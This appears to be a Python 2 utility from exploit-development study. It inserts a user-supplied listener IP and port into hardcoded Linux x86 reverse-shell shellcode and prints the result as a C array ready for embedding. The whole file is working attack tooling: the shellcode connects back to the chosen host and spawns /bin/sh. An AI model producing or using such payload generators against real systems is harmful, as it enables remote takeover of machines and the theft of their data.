#!/usr/bin/env python
#
# Description	: Simply uses the reverse shell I created and inserts
#		  the users desired LHOST and LPORT
#

import sys, socket, binascii

try:
	host = sys.argv[1]
	port = int(sys.argv[2])
except:
	print "Usage: %s <host> <port>" % sys.argv[0]
	print "Example: %s 127.0.0.1 4444" % sys.argv[0]
	sys.exit(0)

com = "\"" # for shellcode qoutes

buf = ""
buf += "\\x6a\\x66\\x58\\x99\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x93\\x59"
buf += "\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x00\\x00\\x00\\x00\\x66\\x68\\xWW"
buf += "\\xWW\\x66\\x6a\\x02\\x89\\xe1\\xb0\\x66\\x6a\\x42\\x51\\x53\\x89\\xe1\\xcd"
buf += "\\x80\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52"
buf += "\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

# check if port less than 1024 or greater that 65535
print "[+] Setting RHOST: %s RPORT: %d" % (host,port)
print "[+] Shellcode byte length: %d" % (len(buf)/4)
if port < 1024:
	print "[-] Privledged port chosen must run as root"
if port > 65535:
	print "[!] There are only 65535 ports"
	sys.exit(0)

# convert to hexadeximal
host = binascii.hexlify(socket.inet_aton(host))
port = hex(port).split('x')[-1]
# place in shellcode format
host = "\\x" + host[0:2] + "\\x" + host[2:4] + "\\x" + host[4:6] + "\\x" + host[6:8]
if len(port) > 2:
	port = "\\x" + port[0:2] + "\\x" + port[2:4]
if len(port) <= 2:
	port = "\\x" + port[0:2]
# NO NULLS! Replace them with our host
newh = buf.replace("\\x00\\x00\\x00\\x00", host)
newp = newh.replace("\\xWW\\xWW", port)
# print the shellcode evenly
print "[+] Final shellcode: \n"
print "char shellcode[]= "
splt = [newp[x:x+60] for x in range(0,len(newp),60)]
for i in range(len(splt)):
	if i == (len(splt) - 1):
		print com + splt[i] + com + ";"
	else:
		print com + splt[i] + com
